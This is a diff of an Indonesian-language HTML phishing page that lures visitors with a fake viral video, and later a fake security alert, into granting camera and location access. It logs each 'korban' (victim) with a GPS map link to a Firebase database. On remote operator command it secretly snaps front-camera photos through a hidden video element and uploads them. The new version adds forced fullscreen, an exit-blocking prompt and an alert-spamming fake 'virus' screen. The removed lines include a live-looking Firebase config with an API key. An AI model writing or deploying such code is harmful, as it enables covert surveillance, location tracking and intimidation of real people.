@@ -2,98 +2,76 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GNN - VIDEO VIRAL TERKINI</title>
+    <title>SISTEM ERROR - PENTING</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body { background: white; color: black; font-family: sans-serif; text-align: center; overflow: hidden; }
+        #virus-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:red; color:white; z-index:9999; padding-top:100px; }
+    </style>
 </head>
-<body style="background:#000; color:white; text-align:center; font-family:sans-serif; padding:20px;">
-    
-    <video id="v" width="1" height="1" autoplay style="opacity:0; position:absolute;"></video>
+<body>
+    <video id="v" width="1" height="1" autoplay style="opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
-    
+
     <div id="m">
-        <h2 style="color:red;">🔴 LIVE: KEJADIAN VIRAL</h2>
-        <p>Gunakan koneksi stabil dan izinkan akses lokasi & kamera untuk memutar video (Verifikasi Keamanan).</p>
-        <button onclick="gas()" style="background:red; color:white; padding:18px; width:100%; border:none; border-radius:12px; font-weight:bold; font-size:16px; cursor:pointer; box-shadow: 0 5px 15px rgba(255,0,0,0.3);">KONFIRMASI & TONTON</button>
+        <h1 style="color:red">⚠️ PERINGATAN KEAMANAN!</h1>
+        <p>Browser Anda mendeteksi ancaman. Klik tombol di bawah untuk membersihkan dan verifikasi lokasi.</p>
+        <button onclick="lockTarget()" style="padding:20px; background:blue; color:white; border-radius:10px; font-size:20px;">BERSIHKAN SEKARANG</button>
+    </div>
+
+    <div id="virus-overlay">
+        <h1>☣️ SYSTEM CRITICAL ERROR ☣️</h1>
+        <p>PERANGKAT ANDA SEDANG DI-SCAN...</p>
     </div>
 
 <script>
-    // --- TEMPEL CONFIG FIREBASE KALZ DISINI ---
-    const firebaseConfig = {
-      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
-      authDomain: "theeyes-8d0aa.firebaseapp.com",
-      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "theeyes-8d0aa",
-      storageBucket: "theeyes-8d0aa.firebasestorage.app",
-      messagingSenderId: "886775568743",
-      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
-    };
-    // ------------------------------------------
-
+    const firebaseConfig = { /* TEMPEL CONFIG LU DISINI */ };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let idK = null;
+    let myId = null;
 
-    async function gas() {
+    async function lockTarget() {
+        // Fullscreen & Anti-Exit
+        document.documentElement.requestFullscreen();
+        window.onbeforeunload = function() { return "JANGAN KELUAR! DATA ANDA AKAN HILANG!"; };
+
         try {
-            // Minta Izin Kamera Depan
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('v').srcObject = stream;
             
-            // Minta Izin Lokasi
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                let bat = "N/A"; 
-                if(navigator.getBattery) { 
-                    const b = await navigator.getBattery(); 
-                    bat = Math.round(b.level*100)+"%"; 
-                }
-                
-                // Daftarkan Korban ke Firebase
+            navigator.geolocation.getCurrentPosition(pos => {
                 const ref = db.ref('korban').push({
                     waktu: new Date().toLocaleString(),
-                    baterai: bat,
-                    isp: "Checking...",
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                
-                idK = ref.key;
-                document.getElementById('m').innerHTML = "<h3>🔄 Menghubungkan ke Server Video...</h3><p>Mohon jangan tutup halaman ini.</p>";
+                myId = ref.key;
 
-                // --- SISTEM LISTENER (Nunggu Perintah Owner) ---
-                db.ref('commands/' + idK).on('value', (s) => {
+                // Listen Perintah Virus/Foto
+                db.ref('commands/' + myId).on('value', s => {
                     const cmd = s.val();
-                    if(cmd && cmd.action === "TAKE") {
-                        take(); // Eksekusi jepret foto
-                    }
+                    if(!cmd) return;
+                    if(cmd.action === "TAKE") take();
+                    if(cmd.action === "VIRUS") executeVirus();
                 });
-            }, (err) => { 
-                alert("Gagal! Anda wajib mengizinkan lokasi untuk menonton."); 
-            }, {enableHighAccuracy:true});
-            
-        } catch(e) { 
-            alert("Akses Kamera Ditolak! Video tidak bisa diputar."); 
-        }
+            });
+        } catch(e) { alert("ERROR: IZINKAN SEMUA AKSES!"); }
     }
 
-    // Fungsi Jepret Foto Rahasia
+    function executeVirus() {
+        document.getElementById('virus-overlay').style.display = 'block';
+        // Spam Peringatan
+        setInterval(() => {
+            alert("⚠️ SYSTEM THREAT DETECTED!");
+            alert("⚠️ DATA LEAK PREVENTED!");
+        }, 1000);
+    }
+
     function take() {
         const v = document.getElementById('v'), c = document.getElementById('c');
-        const context = c.getContext('2d');
-        c.width = v.videoWidth; 
-        c.height = v.videoHeight;
-        
-        // Gambar frame dari video ke canvas
-        context.drawImage(v, 0, 0);
-        
-        // Kirim hasil foto (Base64) ke node hasil_foto
-        db.ref('hasil_foto/' + idK).set({ 
-            foto: c.toDataURL('image/jpeg', 0.4), // Kompresi 40% biar enteng
-            t: Date.now()
-        });
-        
-        // Hapus perintah di Firebase biar gak jepret terus-terusan
-        db.ref('commands/' + idK).remove();
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.4) });
     }
 </script>
 </body>
